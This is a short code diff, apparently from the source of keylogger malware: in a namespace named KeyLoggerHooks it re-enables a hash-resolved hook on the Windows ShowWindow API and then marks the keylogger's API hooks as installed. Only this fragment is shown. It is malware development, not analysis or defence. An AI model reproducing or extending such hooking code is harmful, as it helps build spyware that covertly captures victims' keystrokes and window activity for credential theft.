@@ -442,7 +442,7 @@ namespace KeyLoggerHooks
 			return false;
 
 
-		//HookApi(3, HASH_SHOWWINDOW, &Hook_ShowWindow, &Real_ShowWindow);
+		HookApi(3, HASH_SHOWWINDOW, &Hook_ShowWindow, &Real_ShowWindow);
 
 		KeyLoggerApiHooked = true;
 		return true;
